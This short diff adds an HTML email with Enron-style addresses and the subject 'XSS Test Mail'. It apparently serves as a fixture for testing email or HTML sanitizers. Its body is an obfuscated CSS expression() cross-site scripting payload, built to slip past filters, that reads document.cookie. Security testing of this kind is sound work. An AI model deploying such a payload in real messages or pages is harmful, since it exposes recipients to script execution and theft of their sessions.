@@ -1,0 +1,7 @@
+From: ashok.mehta@enron.com
+To: tim.belden@enron.com, p..o'neil@enron.com, timothy.heizenrader@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<A target="_blank" STYLE="no\xss:noxss(&quot;*//*&quot;);xss:ex/*gg*//**/pression(if(window.x!=1){alert(document.cookie);window.x=1;})">document.cookie>
